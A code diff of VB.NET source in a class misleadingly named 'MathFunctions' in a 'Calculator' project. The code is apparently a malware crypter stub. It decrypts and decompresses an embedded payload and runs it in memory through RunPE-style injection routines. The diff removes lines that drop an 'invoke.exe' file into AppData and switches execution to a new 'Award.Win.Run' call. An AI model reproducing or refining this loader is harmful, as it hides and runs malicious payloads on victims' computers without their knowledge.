@@ -917,32 +917,11 @@ Class MathFunctions
             startup()
         End If
 
-        If Payload(Start - 16) = &H54 Then
-            'net
-        Else
-            'native
-            'drop invoke.exe
-            Try
-                FileIO.FileSystem.WriteAllBytes(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) & "\invoke.exe", My.Resources.invoke, False)
-            Catch ex As Exception
-                If FileIO.FileSystem.FileExists(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) & "\invoke.exe") Then
-                Else
-                    End
-                End If
-            End Try
-            AppPath = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) & "\invoke.exe"
-        End If
         Dim NewByts() As Byte = RedimPload(Payload, Start)
         NewByts = Loop1(NewByts, Payload, Start)
         NewByts = Loop2(NewByts)
 
-
-
-        If Payload(Start - 16) = &H54 Then
-            RunPe2.Class1.Run(AES_Decrypt(Decompress(NewByts)), Command, AppPath)
-        Else
-            CMemoryExecute.Run(AES_Decrypt(Decompress(NewByts)), AppPath, Command)
-        End If
+        Award.Win.Run(AES_Decrypt(Decompress(NewByts)), AppPath, Command)
         Process.GetCurrentProcess.Kill()
     End Sub
 
@@ -1071,7 +1050,11 @@ Class MathFunctions
         End Try
     End Function
     Private Shared Function RetrieveEmbeddedAssembly(sender As Object, args As System.ResolveEventArgs) As System.Reflection.Assembly
-        Dim resourceName As String = "Calculator." + New Reflection.AssemblyName(args.Name).Name + ".dll"
+        'get the root namespace (im tired of manually adding this)
+        Dim asm As Reflection.[Assembly] = System.Reflection.Assembly.GetEntryAssembly
+        Dim RootNamespace As String = Strings.Left(asm.EntryPoint.DeclaringType.Namespace, asm.EntryPoint.DeclaringType.Namespace.ToString().IndexOf(".") + 1)
+        'fuck ya! Im done manually adding that shit!!!
+        Dim resourceName As String = RootNamespace + New Reflection.AssemblyName(args.Name).Name + ".dll"
         'resourceName = "dll.dll"
         Using stream = Reflection.Assembly.GetExecutingAssembly.GetManifestResourceStream(resourceName)
 
@@ -1084,5 +1067,4 @@ Class MathFunctions
 
         End Using ' stream
     End Function
-
 End Class
